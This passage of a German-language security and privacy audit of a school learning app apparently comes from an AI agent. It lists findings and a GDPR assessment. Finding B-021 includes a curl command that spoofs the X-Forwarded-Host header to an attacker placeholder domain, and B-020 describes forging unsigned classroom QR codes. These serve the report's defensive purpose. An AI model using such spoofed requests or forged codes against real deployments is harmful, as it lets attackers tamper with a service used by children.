- **Beschreibung:** Das „HMAC-Token“ ist ein zufälliges 128-bit-Geheimnis, das im **ausgedruckten** Einschreibe-QR steht. Wer ein Foto des QR-Bogens hat, kann für jedes Kind gültige Leistungsbriefe fälschen. Das Kind selbst kann seine eigenen Ergebnisse ohnehin beliebig erzeugen; das ist eine bekannte PWA-Grenze (Vault 16). Aufgaben-QRs sind unsigniert. Mit einer Klassen-ID, die in jedem Einschreibe-QR steht, kann jeder „Aufgaben der Lehrkraft“ und Entfernungscodes für die Klasse erzeugen. Ein Kind muss den Code aber selbst scannen.
- **Reproduktion / Prüfweg:** Codepfade.
- **Betroffene Nutzergruppen:** Lehrkräfte (Vertrauen in Leistungsbriefe), Kinder (Streiche).
- **Mögliche Folgen:** Geringe Integrität der Abgabeprotokolle; Social Engineering unter Kindern.
- **Empfehlung:** Leistungsbriefe ausdrücklich als „nicht fälschungssicher“ kennzeichnen und nicht für Noten verwenden. Aufgaben- und Entfernungs-QRs mit dem Klassenschlüssel (ECDSA) signieren; die Prüfung ist auf dem Kindgerät vorhanden (`sealPublicKey`).
- **Aufwand (grob):** S–M
- **Erfolgskriterium:** Ein unsignierter Aufgaben-QR wird abgewiesen (Test).

### B-021 – Host-Header fließt ungeprüft in Metadaten

- **Bereich:** Web-Sicherheit
- **Status:** bestätigt (reproduziert, Dev-Server)
- **Schweregrad:** P3
- **Sicherheit der Einschätzung:** hoch
- **Fundstelle:** `app/layout.tsx:38-49` (`generateMetadata`: `x-forwarded-host`/`x-forwarded-proto` → `metadataBase`, `og:image`)
- **Beschreibung:** Ein Angreifer kann `og:image` und andere absolute Metadaten-URLs auf fremde Hosts lenken. Da HTML mit `no-store` ausgeliefert wird, ist eine Cache-Vergiftung unwahrscheinlich. Relevant wird es, wenn künftig ein Edge-Cache oder kanonische Links dazukommen.
- **Reproduktion / Prüfweg:** `curl -H "X-Forwarded-Host: evil.example" -H "X-Forwarded-Proto: https" http://127.0.0.1:3002/impressum` → `og:image = https://evil.example/og.png`.
- **Betroffene Nutzergruppen:** keine unmittelbar.
- **Mögliche Folgen:** gering.
- **Empfehlung:** Basis-URL aus einer Konfigurationsvariablen lesen.
- **Aufwand (grob):** S
- **Erfolgskriterium:** Test mit gefälschtem Header liefert die konfigurierte Domain.

### B-022 – Abhängigkeiten: Auditbefund harmlos, Begründung methodisch schief, Framework-Reife ein Risiko

- **Bereich:** Lieferkette
- **Status:** bestätigt (ausgeführt)
- **Schweregrad:** P3
- **Sicherheit der Einschätzung:** mittel
- **Fundstelle:** `package.json` (`vinext`, `react-server-dom-webpack`, `@vitejs/plugin-rsc` als devDependencies), `worker/index.ts:2-3` (bündelt `vinext/server/*`), `docs/security-risk-register.md` SR-001
- **Beschreibung:** `npm audit` meldet 10 Befunde (7 hoch, 3 mittel): `braces`/`micromatch`/`fast-glob` über `@next/eslint-plugin-next` und `vinext → vite-plugin-commonjs`, außerdem `fflate`/`satori`/`@vercel/og`. Die Einschätzung im Register, dass keine davon zur Laufzeit erreichbar ist, halte ich für plausibel: Lint/Build bzw. keine OG-Bilder, Suche in `dist` laut Register. **Aber** das Argument „`--omit=dev` = 0 = ausgelieferte Pakete“ ist methodisch falsch: Die Laufzeit des Workers (vinext-Server, RSC-Runtime) ist als devDependency deklariert und wird trotzdem ausgeliefert. `--omit=dev` prüft also gerade den Framework-Kern nicht. Hinzu kommt die geringe Reife von vinext 1.1.0 als Nachbau von Next.js: Sicherheitskorrekturen von Next.js/React (vgl. die RSC-Lücken 2025) müssen dort eigens nachgezogen werden. Es gibt keine Server Actions (`"use server"` nicht gefunden); das verkleinert die Angriffsfläche.
- **Reproduktion / Prüfweg:** `npm audit --json` → `{"moderate":3,"high":7,"critical":0,"total":10}`; `npm audit --omit=dev` → `total:0`.
- **Betroffene Nutzergruppen:** Betreiber.
- **Mögliche Folgen:** Übersehene Laufzeitlücken im Framework.
- **Empfehlung:** Laufzeitpakete (vinext, react-server-dom-webpack) als `dependencies` führen, damit `--omit=dev` aussagekräftig wird. Sicherheitsmeldungen von vinext, React (RSC) und Next.js abonnieren. Den Ausstiegspfad (SR-001) mit Auslöse-Kriterien versehen.
- **Aufwand (grob):** S
- **Erfolgskriterium:** `npm audit --omit=dev` umfasst die Worker-Laufzeit; das Register nennt den Prüfrhythmus mit Datum.

### B-023 – `SECURITY DEFINER` mit `search_path`, der `public` zuerst durchsucht

- **Bereich:** Datenbankhärtung
- **Status:** bestätigt (Codeanalyse)
- **Schweregrad:** P3
- **Sicherheit der Einschätzung:** mittel
- **Fundstelle:** u. a. `20260825124001_migrate_laufdiktat_live_rooms.sql` (alle Raum-RPCs: `set search_path=public,private,extensions,pg_catalog`), `20261003120000_room_time_limits.sql:21`; vorbildlich dagegen die Transfer-RPCs (`set search_path = ''`)
- **Beschreibung:** Alle `SECURITY DEFINER`-Funktionen setzen einen `search_path`. Das ist gut, der Supabase-Linter wäre zufrieden. Die Raum-Funktionen durchsuchen aber `public` vor `pg_catalog`. Ein Objekt in `public`, das eine Katalogfunktion überschattet, liefe mit Owner-Rechten. Heute dürfen `anon`/`authenticated` nichts in `public` anlegen, daher nur ein Härtungspunkt. Positiv: `revoke … from public`, Standardrechte entzogen (`harden_default_api_privileges`), `force row level security`, Tabellen ohne Clientrechte, DB-Vertragstests.
- **Reproduktion / Prüfweg:** Migrationen lesen.
- **Betroffene Nutzergruppen:** Betreiber.
- **Mögliche Folgen:** Rechteausweitung nur bei künftigen Fehlkonfigurationen.
- **Empfehlung:** Einheitlich `set search_path = ''` mit voll qualifizierten Namen, wie bei den Transfer-Funktionen. Ein DB-Test, der das für alle `SECURITY DEFINER`-Funktionen prüft.
- **Aufwand (grob):** S
- **Erfolgskriterium:** Abfrage auf `pg_proc.proconfig` im Vertragstest grün.

### B-024 – Sicherheits- und Offline-Eigenschaften sind kaum durch Tests abgesichert

- **Bereich:** Qualitätssicherung (Querschnitt)
- **Status:** bestätigt (Codeanalyse)
- **Schweregrad:** P2
- **Sicherheit der Einschätzung:** hoch
- **Fundstelle:** `playwright.config.ts:24`, `tests/rendered-html.test.mjs:232-256`, fehlende Tests zu Realtime-Autorisierung, Sicherungs-Round-Trip mit allen Tabellen, Sicherheitsheadern, CSV-Formeln, Downgrade, Stationsbindung
- **Beschreibung:** Die Testsuite ist groß (1683 Unit-Tests, 19 DB-Vertragstests). Die hier gefundenen Fehler liegen aber genau in nicht getesteten Eigenschaften: Was der Angreifer _nicht_ darf, und ob die Sicherung _alles_ enthält. Der Service Worker wird nur per Regex auf Quelltext geprüft und in der E2E-Suite blockiert.
- **Reproduktion / Prüfweg:** siehe Einzelbefunde.
- **Betroffene Nutzergruppen:** alle (indirekt).
- **Mögliche Folgen:** Rückfälle, falsche Sicherheit durch grüne CI.
- **Empfehlung:** Missbrauchsfall-Tests als eigene Kategorie: DB-Vertragstests je RPC für den „fremden Teilnehmer“, ein Strukturtest für die Sicherung (alle Dexie-Tabellen und Felder), eine Offline-Suite gegen den Produktionsbuild, Header-Tests. Die Repro-Tests dieses Berichts lassen sich nahezu unverändert übernehmen.
- **Aufwand (grob):** M
- **Erfolgskriterium:** Jeder Befund B-001 bis B-021 hat einen Regressionstest.

---

## 5. Datenschutzrechtliche Einordnung (keine Rechtsberatung)

### 5.1 Welche personenbezogenen Daten werden wo verarbeitet? (Stand Code)

| Daten                                                                         | Ort                                              | Empfänger/Dritte                                           | Frist                                         | Bemerkung                                                       |
| ----------------------------------------------------------------------------- | ------------------------------------------------ | ---------------------------------------------------------- | --------------------------------------------- | --------------------------------------------------------------- |
| Lernhistorie, Fehler, Leitner-Stände, Wortspeicher, Tierprofil                | IndexedDB/localStorage Schülergerät              | keine                                                      | unbegrenzt bis Löschung durch Browser (B-002) | local-first, gut                                                |
| Klassenmitgliedschaft (Klarname, Klasse, Lehrkraft, LRS-Freigabe)             | Schülergerät; Einschreibe-QR; ausgedruckte Bögen | jeder, der den QR sieht (B-008)                            | unbegrenzt                                    | sensibel                                                        |
| Klassen, Schülerlisten, LRS-Haken, Leistungsbriefe, private Klassenschlüssel  | IndexedDB Lehrergerät                            | jeder Nutzer des Geräts (B-009)                            | unbegrenzt                                    |                                                                 |
| Lehrerdaten im Geräte-Abgleich                                                | Cloud der Lehrkraft (WebDAV/OneDrive/Google)     | Anbieter; bei Microsoft/Google US-Unternehmen              | unbegrenzt                                    | optional, Verschlüsselung empfohlen, Schlüssel nur mit Passwort |
| Schüler-Cloud-Sicherung                                                       | Cloud des Kindes/der Eltern                      | Anbieter                                                   | unbegrenzt                                    | **unverschlüsselt** (`sync.ts:20-21`); ab B-001 ohnehin defekt  |
| Live-Raum: Tier, Teilnehmer-ID, Fortschritt, Fehlerwörter, Dauer, App-Version | Supabase (eu-west-1, Supabase Inc.)              | Supabase; über Realtime alle Raumgeräte und Fremde (B-003) | bis 24 h nach Raumende                        | keine Klarnamen, gut                                            |
| IP-Adresse (Hash)                                                             | `private.request_limits`                         | Supabase                                                   | 1 Tag                                         | ungesalzener SHA-256 (B-005)                                    |
| Verschlüsselte Inhaltspakete                                                  | Supabase                                         | Supabase                                                   | ≤ 24 h                                        | Lehrkraftmaterial                                               |
| Verbindungsdaten (IP, UA)                                                     | Cloudflare, Supabase                             | beide US-Unternehmen                                       | nicht dokumentiert                            | Log-Aufbewahrung nicht prüfbar                                  |
| Vorgelesene Texte                                                             | Browser-TTS                                      | ggf. Google/Microsoft (B-012)                              | unbekannt                                     | nicht in Datenschutzerklärung                                   |
| OAuth-/WebDAV-Zugangsdaten                                                    | Lehrergerät (B-016)                              | –                                                          | bis Trennung                                  |                                                                 |

Keine Analyse-, Werbe- oder Telemetriedienste gefunden, Schriften selbst
gehostet. Das ist eine echte Stärke.

### 5.2 Gesicherte Anforderungen (hohe Sicherheit, ohne Einzelfallprüfung)

- DSGVO und BayDSG gelten. Für die Verarbeitung im Unterricht durch eine
  öffentliche Schule ist die Rechtsgrundlage in der Regel Art. 6 Abs. 1 lit. e
  DSGVO i. V. m. Art. 85 BayEUG. Verantwortlich ist dann die **Schule**
  (Schulleitung), nicht die einzelne Lehrkraft als Privatperson.
- Informationspflichten nach Art. 13 DSGVO gegenüber Kindern und Eltern, in
  kindgerechter Sprache (Art. 12).
- Verzeichnis der Verarbeitungstätigkeiten (Art. 30) und Beteiligung der
  behördlichen Datenschutzbeauftragten der Schule.
- Auftragsverarbeitungsverträge (Art. 28) mit Supabase und Cloudflare,
  abgeschlossen durch den Verantwortlichen. Für US-Anbieter ist der
  Drittlandbezug zu prüfen (Kapitel V): Für Supabase fand ich keinen Beleg einer
  DPF-Zertifizierung; deren DPA arbeitet laut Drittquelle mit
  Standardvertragsklauseln.
- Technisch-organisatorische Maßnahmen nach Art. 25/32. Dazu gehören hier
  B-003, B-008, B-009, B-010 und B-015.
- Bayerische Regeln für Verarbeitungsverfahren der Schulen: § 46 BaySchO
  i. V. m. Anlage 2 (Hinweis in der VollzBek DS-Schulen; Wortlaut der Anlage
  **nicht online verifiziert**).

### 5.3 Juristisch zu prüfende Fragen (offen)

1. **Ist die Schreiberleichterung bzw. die LRS-Kennzeichnung ein Gesundheitsdatum
   nach Art. 9 DSGVO?** Für eine diagnostizierte Lese-Rechtschreib-Störung
   spricht viel dafür, für eine pädagogische Fördermaßnahme ohne Diagnose
   weniger. Davon hängen Rechtsgrundlage, DSFA-Pflicht und Zulässigkeit der
   QR-Lösung ab.
2. **Wer ist Verantwortlicher im Pilot?** Datenschutzerklärung und Impressum
   nennen die Lehrkraft als Privatperson, eingesetzt wird die App im Unterricht.
3. **Ist eine DSFA (Art. 35) erforderlich?** Gründe dafür: Kinder als
   schutzbedürftige Gruppe, neue Technologie, mögliche Art.-9-Daten. Mindestens
   eine dokumentierte Schwellwertprüfung ist nötig.
4. **Dürfen Lehrkräfte Schülerlisten, LRS-Status und Ergebnisse in privaten
   Cloud-Konten (OneDrive „common“, Google) ablegen?** Für private Endgeräte
   sehen die Länder in der Regel eine schriftliche Genehmigung der Schulleitung
   vor. In Hessen ist das ausdrücklich geregelt; für Bayern (Anlage 2 BaySchO,
   Abschnitt zu privaten Datenverarbeitungsgeräten) nicht online verifiziert.
   Für private Cloud-Dienste ist es nochmals strenger zu prüfen.
5. **Schüler-Cloud-Sicherung mit eigenem Google-/Microsoft-Konto:** Einwilligung
   der Eltern nötig? Zulässig im schulischen Kontext?
6. **Reicht die Pseudonymisierung (Tiere) in Live-Räumen**, wenn Lehrkraft und
   Mitschüler die Zuordnung kennen? Pseudonyme Daten bleiben personenbezogen
   (so auch Vault 13).
7. **Impressumspflicht** (§ 5 DDG): Genügt „Anschrift auf Anfrage“ bei einem
   nicht-kommerziellen Angebot?

Diese Fragen kann nur die Schule mit ihrer bzw. ihrem Datenschutzbeauftragten,
ggf. mit dem BayLfD oder dem Staatsministerium, verbindlich klären.

---

## 6. Bewertung der Dimensionen

| Dimension                              | Wert (0–5) | Begründung                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| -------------------------------------- | ---------: | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Sicherheit und Datenschutz             |    **2,5** | Stark: local-first und datensparsam (Tiere statt Namen, keine Telemetrie, 24-h-Löschung), RPC-Fähigkeitsmodell mit entzogenen Tabellenrechten, gehashten Tokens und DB-Vertragstests, solide Krypto-Bausteine (AES-GCM, PBKDF2 600 000, PKCE), Zod-Validierung überall, keine XSS-Senke gefunden. Schwach: Realtime komplett unautorisiert (B-003), LRS-Information für jeden lesbar (B-008), keine Personentrennung an geteilten Geräten (B-009, B-010), keine CSP/Header (B-015) und ein Rechtsrahmen, der laut eigenem Impressum keinen Echtbetrieb trägt (B-011). Das Risikoregister ist ehrlich, aber unvollständig: Realtime, Speicherlöschung, Cloud-Stimmen und QR-Offenlegung fehlen. |
| Zuverlässigkeit (Datenverlust/Offline) |      **2** | Stark: zusammenführende Wiederherstellung ohne Überschreiben, geordnete Fortschrittszustellung mit Wiederholung, Weiterarbeiten bei Netzabbruch innerhalb einer geladenen Seite, ausfallsicherer Geräte-Abgleich mit HLC, Grabsteinen und Vorbedingungen. Schwach: Die Sicherung bricht bei normaler Nutzung ab (B-001). Es gibt keine Antwort auf die iPadOS-Speicherlöschung (B-002). Offline funktioniert nur, was schon besucht wurde, und nach jedem Update fast nichts (B-013). Live-Identitäten hängen am Tab (B-019). Der Supabase-Betrieb ist nicht abgesichert (B-020). Für eine App, deren Kernversprechen „Lernstand bleibt lokal“ lautet, ist das der kritischste Bereich.        |

## 7. Die fünf wichtigsten Befunde

1. **B-001 (P1)**: Die Sicherung scheitert vollständig, sobald ein Kind
   LernBox-Ordner nutzt. Kleiner Fix, große Wirkung.
2. **B-002 (P1)**: Keine Maßnahme gegen Speicherlöschung unter iPadOS/Safari
   (7-Tage-Regel, getrennte Speicher bei Installation, Speicherdruck, MDM). Im
   Zusammenspiel mit B-001 droht realer Verlust ganzer Lernstände.
3. **B-003 (P1)**: Öffentliche Realtime-Kanäle. Jeder mit Raumcode und
   öffentlichem Key fälscht Teilnehmer auf dem Lehrer-Beamer, stört Battles und
   liest Fehlerdaten mit.
4. **B-011 (P1)**: Echtbetrieb mit Kindern ohne Freigabe, AVV, Verzeichnis und
   DSFA. Die Datenschutzerklärung ist unvollständig und teils falsch, das
   Impressum untersagt den laufenden Einsatz.
5. **B-008 (P1)**: Die LRS-Freigabe steht lesbar im Einschreibe-QR und ist an
   Länge und Anzeigegröße erkennbar.

Direkt dahinter: B-009/B-010 (geteilte Geräte für Lehrkraft und Kinder),
B-013 (Offline), B-004/B-005/B-006 (Missbrauch der Raum-API).

## 8. Echte Stärken (ausdrücklich geprüft, nicht nur behauptet)

- **Fähigkeitsbasiertes Supabase-Modell:** Tabellen ohne Clientrechte und mit
  `force row level security`, nur ausgewählte RPCs für `anon`, Standardrechte
  entzogen, Tokens nur gehasht, Wiedereintritts-Token raumgebunden (globaler
  Unique-Index), Sperre beendeter Räume, serverseitige Fristen. Die 19
  DB-Vertragstests laufen gegen die Originalmigrationen. Das ist mehr als in
  vielen kommerziellen Schulprodukten.
- **Datensparsamkeit im Live-Raum:** Tiere statt Namen, serverseitige
  Whitelist der Tiernamen, Löschung 24 h nach Ende. Start und Ende per Broadcast
  lösen nur einen autorisierten Abgleich aus, Inhalte kommen nie über den
  Broadcast.
- **Inhaltsübertragung:** saubere AES-GCM-Umschlagverschlüsselung, Code-Entropie
  (40 + 80 bit) ohne Modulo-Verzerrung, Fehlversuchssperre, Ablauf nach 24 h
  mit Cron-Löschung.
- **Klassenstempel (ECDSA P-256):** verhindert selbst ausgestellte Freigaben im
  Raum der echten Lehrkraft. Das Restrisiko ist ehrlich dokumentiert (SR-002).
- **Cloud-Abgleich:** PKCE S256 mit `state`, kein Client-Secret, enge Scopes,
  nicht exportierbarer Passwortschlüssel, keine Schlüssel ohne Passwort,
  fail-safe Transaktionen, Grabsteine, `If-Match`.
- **Keine Telemetrie, keine Tracker, selbst gehostete Schriften, KaTeX mit
  `trust:false`** und Expansionslimit, durchgängige Zod-Validierung von
  QR-/JSON-Eingaben.
- **Ehrlichkeit der Doku:** Risikoregister und Vault benennen viele Grenzen
  selbst, etwa geteilte Geräte, offene AVV oder Gateway-Prüfung. Das Problem
  ist, dass der Betrieb diesen eigenen Vorbehalten vorausgeeilt ist.

## 9. Quellen (Webrecherche am 20.10.2026; Normtexte teils nicht online verifiziert)

- WebKit: Full Third-Party Cookie Blocking and More (7-Tage-Regel für skriptbeschreibbaren Speicher, Ausnahme Home-Bildschirm-Apps) – https://webkit.org/?p=10218 ; Zusammenfassung https://mjtsai.com/blog/2020/03/26/safari-13-1-third-party-cookie-blocking-and-7-day-script-writeable-storage/ ; WebKit Bug 211775 https://bugs.webkit.org/show_bug.cgi?id=211775
- WebKit: Updates to Storage Policy – https://webkit.org/?p=14403 (Inhalt per WebFetch nicht abrufbar; Aussage zu Quoten aus Suchergebnis)
- Getrennte Speicher Safari/Home-Bildschirm (älter, nicht auf aktuellem iPadOS verifiziert) – https://blog.appstudio.dev/2012/09/important-io6-and-data-storage/ ; https://developer.apple.com/forums/thread/710157
- Supabase Realtime Authorization – https://supabase.com/docs/guides/realtime/authorization ; https://supabase.com/blog/supabase-realtime-broadcast-and-presence-authorization.md
- Cloudflare HTTP request headers (X-Forwarded-For wird ergänzt) – https://developers.cloudflare.com/fundamentals/reference/http-request-headers
- Supabase GDPR/Datenresidenz – https://supabase.com/docs/guides/security/gdpr-compliance ; https://supabase.com/legal/privacy-resources/data-residency-and-transfers-faq
- Supabase Free-Tarif/Pausierung (Drittquellen) – https://www.jetadmin.io/blog/supabase-pricing-2026-guide-to-plans-limits-and-real-world-costs/ ; https://costbench.com/software/database-as-service/supabase/free-plan/
- § 36 BaySchO (Nachweis LRS) – https://www.gesetze-bayern.de/Content/Document/BaySchO2016-36 (nur Suchtreffer, Volltext nicht abrufbar)
- VollzBek DS – Schulen (Bayern) – https://www.gesetze-bayern.de/Content/Document/BayVV_204_K_13178-2 (nur Suchtreffer)
- Hessen, Verarbeitung schulischer Daten auf privaten Geräten (Vergleich) – https://kultus.hessen.de/digitalisierung/datenschutz-an-schulen/datenschutz-im-taeglichen-schulbetrieb/verarbeitung-schulischer-daten-auf-privaten-datenverarbeitungseinrichtungen
- OWASP CSV Injection (aus Fachkenntnis, nicht online verifiziert) – https://owasp.org/www-community/attacks/CSV_Injection

## 10. Reproduktionsartefakte (Scratchpad, nicht im Repository)

`/tmp/claude-0/-home-user-Lernplattform/c2fe15db-371c-56e7-8bd8-eafd11c1a5af/scratchpad/repro-b/`:
`backup-folders.test.ts`, `db-abuse.test.mjs`, `csv-injection.test.ts`,
`sync-downgrade.test.ts`, `lrs-qr.test.tsx`, `voices.test.ts`,
`browser/offline-proxy.mjs`, `browser/offline-proxy3.mjs` (Logs
`offline-proxy*.log`), `npm-audit.json`.
